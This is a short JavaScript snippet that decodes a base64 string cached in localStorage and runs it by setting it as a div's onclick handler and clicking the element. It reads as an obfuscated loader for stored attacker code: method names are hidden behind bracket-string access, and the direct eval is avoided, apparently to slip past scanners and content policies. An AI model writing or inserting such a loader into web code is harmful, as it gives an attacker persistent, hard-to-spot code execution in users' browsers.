function replayStoredScript() {
  var source = localStorage["getItem"]("cached-module");
  if (source) {
    var element = document["createElement"]("div");
    element["setAttribute"]("onclick", atob(source));
    document.documentElement["appendChild"](element);
    element["click"]();
  }
}
replayStoredScript();
